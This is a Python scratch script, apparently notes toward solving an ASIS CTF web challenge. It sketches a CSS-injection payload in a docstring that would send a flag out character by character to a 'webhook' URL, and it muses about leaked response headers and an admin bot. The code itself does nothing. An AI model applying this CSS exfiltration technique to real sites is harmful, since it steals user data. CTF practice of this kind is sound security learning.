#!/usr/bin/env python3
"""
ASIS CTF - Bookmarks - CSS Injection Attack

Since username is displayed in HTML (escaped, but visible),
we can use CSS injection to exfiltrate it character by character!

The username appears in: <p>Welcome, {{ username }}! Here is your book list:</p>

We can inject CSS that loads external images based on attribute selectors.
"""

import requests
import sys

TARGET = "http://65.109.202.184"

def create_css_injection_user(webhook_url, char_to_test='A'):
    """
    Create a user that injects CSS to test for specific characters
    
    CSS Injection payload:
    <style>
    p:has-text("ASIS{a") { background: url(webhook?char=a); }
    </style>
    
    But :has-text doesn't exist... we need attribute selectors
    
    Actually, the username is in the BODY, not in an attribute.
    We need a different approach.
    
    Alternative: Use timing attacks or CSS exfiltration via @import
    """
    
    # This won't work easily with modern CSS...
    # Let's try a different approach
    pass


# Actually, I think the real vulnerability is simpler.
# Let me re-read the code one more time...

if __name__ == "__main__":
    print("[!] CSS Injection approach is complex and may not work")
    print("[!] Let me reconsider the vulnerability...")
    
    # The key issue: response.headers['X-User-' + username] = user_id
    # This creates a header like: X-User-ASIS{flag}: 123
    
    # But we can't read other users' headers due to SOP
    
    # UNLESS... the bot visits OUR page while logged in as FLAG!
    # Then the bot's browser makes a request that includes the FLAG header
    
    # But the bot visits our URL BEFORE logging in...
    
    # Wait! What if we make the bot revisit after login?
    # The bot does "admin stuff" for 5 seconds - maybe it visits URLs again?
    
    print("\n[*] Checking bot.py for admin stuff behavior...")
